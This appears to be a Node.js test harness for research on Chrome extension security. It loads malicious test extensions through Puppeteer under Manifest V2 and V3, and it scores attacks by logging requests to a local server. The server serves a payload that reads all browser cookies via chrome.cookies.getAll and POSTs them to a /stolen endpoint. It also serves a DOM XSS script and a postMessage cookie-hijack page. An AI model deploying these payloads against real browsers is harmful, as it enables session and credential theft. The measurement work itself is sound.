#!/usr/bin/env node
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { program } from 'commander';
import { createObjectCsvWriter } from 'csv-writer';
import puppeteer from 'puppeteer-core';
import { BIN } from './utils/launchers.js';
import http from 'http';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

program
  .option('--mode <v2|v3|both>', 'browser mode', 'both')
  .option('--count <n>', 'number of test runs', '1')
  .parse();

const opts = program.opts();

// Load config
const CONFIG = JSON.parse(
  fs.readFileSync(path.join(__dirname, 'config.json'))
);

// Server request tracking
let serverRequests = [];
let attackDetected = false;

// Create test server that logs everything
const server = http.createServer((req, res) => {
  const timestamp = new Date().toISOString();
  const logEntry = { time: timestamp, method: req.method, url: req.url };
  
  console.log(`[SERVER ${timestamp}] ${req.method} ${req.url}`);
  serverRequests.push(logEntry);
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }
  
  // Serve payloads
  if (req.url === '/payload.js') {
    res.writeHead(200, { 'Content-Type': 'application/javascript' });
    res.end(`
      console.log('[ATTACK] Executed remote payload via eval()');
      try {
        chrome.cookies.getAll({}, cookies => {
          fetch('http://localhost:8000/stolen', {
            method: 'POST',
            body: JSON.stringify({ type: 'eval-cookies', cookies })
          });
        });
      } catch(e) {
        console.log('[ATTACK] Failed:', e.message);
      }
    `);
  } else if (req.url === '/domxss.js') {
    res.writeHead(200, { 'Content-Type': 'application/javascript' });
    res.end(`alert('XSS executed!'); console.log('[ATTACK] DOM XSS successful');`);
  } else if (req.url === '/config') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      active: true,
      payload: `console.log('[modify-header] Malicious payload executed!');`
    }));
  } else if (req.url === '/stolen' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      console.log(`[STOLEN DATA] ${body.substring(0, 100)}...`);
      attackDetected = true;
      res.writeHead(200);
      res.end('OK');
    });
  } else if (req.url === '/test/message-hijack') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <!DOCTYPE html>
      <html>
      <body>
        <h1>Message Hijack Test</h1>
        <script>
          setTimeout(() => {
            window.postMessage({ action: 'getCookies', domain: 'example.com' }, '*');
            console.log('[TEST] Sent getCookies message');
          }, 1000);
        </script>
      </body>
      </html>
    `);
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

// Start server
server.listen(8000, () => {
  console.log('🚀 Test server running on http://localhost:8000\n');
});

// Attack success criteria based on server logs
function determineAttackSuccess(extensionName, requests) {
  switch(extensionName) {
    case 'cookie-hijacker':
    case 'keylogger':
      // Success if we see POST to /stolen
      return requests.some(r => r.method === 'POST' && r.url === '/stolen');
      
    case 'eval-loader':
      // Success if we see GET /payload.js (shows eval attempted)
      return requests.some(r => r.method === 'GET' && r.url === '/payload.js');
      
    case 'modify-header':
      // Success if we see GET /config AND have other attack indicators
      return requests.some(r => r.method === 'GET' && r.url === '/config');
      
    case 'message-hijack':
      // Success if test page was loaded and POST /stolen happened
      return requests.some(r => r.url === '/test/message-hijack') && 
             requests.some(r => r.method === 'POST' && r.url === '/stolen');
      
    case 'dom-xss':
      // For DOM XSS we need to check page console/alerts (handled separately)
      return false; // Will be set by page detection
      
    case 'unblock-access-control-allow-origin':
      // This doesn't generate attack traffic, just modifies headers
      return false;
      
    default:
      return false;
  }
}

async function testExtension(target, mode) {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`Testing ${target.name} in ${mode.toUpperCase()} mode`);
  console.log(`${'='.repeat(60)}`);
  
  // Clear server state
  serverRequests = [];
  attackDetected = false;
  
  const extensionPath = path.resolve(__dirname, target.path.replace('v2', mode));
  
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
      executablePath: BIN[mode],
      args: [
        `--disable-extensions-except=${extensionPath}`,
        `--load-extension=${extensionPath}`,
        '--no-sandbox',
        '--disable-setuid-sandbox'
      ],
      ignoreDefaultArgs: ['--disable-extensions']
    });

    const page = await browser.newPage();
    
    // Track page-level attacks
    let pageAttackDetected = false;
    
    page.on('console', msg => {
      const text = msg.text();
      if (text.includes('[ATTACK]') || text.includes('[modify-header]') || 
          text.includes('XSS') || text.includes('payload executed')) {
        pageAttackDetected = true;
        console.log(`[PAGE CONSOLE] ${text}`);
      }
    });
    
    page.on('dialog', async dialog => {
      console.log(`[ALERT] ${dialog.message()}`);
      pageAttackDetected = true;
      await dialog.dismiss();
    });
    
    console.log(`Navigating to ${target.trigger_url}...`);
    await page.goto(target.trigger_url, { waitUntil: 'domcontentloaded' });
    
    // Extension-specific actions
    switch(target.name) {
      case 'keylogger':
        console.log('Typing text to trigger keylogger...');
        await page.click('body');
        await page.keyboard.type('This is a test message to trigger the keylogger extension!');
        break;
    }
    
    // Wait for attacks to execute
    console.log('Waiting for attacks to execute...');
    await page.waitForTimeout(10000);
    
    // Determine success based on server logs
    let success = determineAttackSuccess(target.name, serverRequests);
    
    // Special case for DOM XSS (page-level detection)
    if (target.name === 'dom-xss') {
      success = pageAttackDetected;
    }
    
    // If modify-header succeeded on page, mark as success
    if (target.name === 'modify-header' && pageAttackDetected) {
      success = true;
    }
    
    console.log(`\n📊 Results:`);
    console.log(`- Server requests: ${serverRequests.length}`);
    console.log(`- Attack detected: ${success ? '✅ YES' : '❌ NO'}`);
    
    if (serverRequests.length > 0) {
      console.log('\nServer requests received:');
      serverRequests.forEach(r => {
        console.log(`  ${r.method} ${r.url}`);
      });
    }
    
    await browser.close();
    
    return {
      name: target.name,
      attack: target.attack,
      mode: mode,
      success: success,
      reason: success ? 'Attack detected via server logs' : 'No attack detected'
    };
    
  } catch (error) {
    console.error('Error:', error.message);
    if (browser) await browser.close();
    return {
      name: target.name,
      attack: target.attack,
      mode: mode,
      success: false,
      reason: error.message
    };
  }
}

// Main test runner
(async () => {
  const results = [];
  const modes = opts.mode === 'both' ? ['v2', 'v3'] : [opts.mode];
  const count = parseInt(opts.count);
  
  console.log('🚀 Server-based Chrome Extension Security Test');
  console.log('=============================================\n');
  console.log('This test monitors actual server requests to determine attack success.\n');
  
  for (const mode of modes) {
    for (const target of CONFIG) {
      for (let i = 0; i < count; i++) {
        const result = await testExtension(target, mode);
        results.push(result);
        
        // Write to CSV
        const timestamp = Date.now();
        const csvWriter = createObjectCsvWriter({
          path: path.join(__dirname, `../results/raw/${timestamp}_${target.name}_${mode}.csv`),
          header: [
            { id: 'name', title: 'name' },
            { id: 'attack', title: 'attack' },
            { id: 'mode', title: 'mode' },
            { id: 'success', title: 'success' },
            { id: 'reason', title: 'reason' }
          ]
        });
        
        await csvWriter.writeRecords([result]);
      }
    }
  }
  
  // Summary
  console.log('\n\n' + '='.repeat(80));
  console.log('SUMMARY - Based on actual server requests');
  console.log('='.repeat(80) + '\n');
  
  // Calculate success rates
  const successRates = {};
  
  for (const ext of CONFIG) {
    for (const mode of modes) {
      const key = `${ext.name}_${mode}`;
      const extResults = results.filter(r => r.name === ext.name && r.mode === mode);
      const successes = extResults.filter(r => r.success).length;
      const rate = (successes / extResults.length * 100).toFixed(1);
      successRates[key] = rate;
    }
  }
  
  // Display results
  console.log('Success Rates:');
  for (const ext of CONFIG) {
    if (modes.includes('v2') && modes.includes('v3')) {
      const v2Rate = successRates[`${ext.name}_v2`];
      const v3Rate = successRates[`${ext.name}_v3`];
      console.log(`  ${ext.name}: MV2 ${v2Rate}% → MV3 ${v3Rate}%`);
    } else {
      const rate = successRates[`${ext.name}_${modes[0]}`];
      console.log(`  ${ext.name} (${modes[0]}): ${rate}%`);
    }
  }
  
  console.log('\n✅ Testing completed!');
  console.log('Results saved to results/raw/');
  
  server.close();
  process.exit(0);
})(); 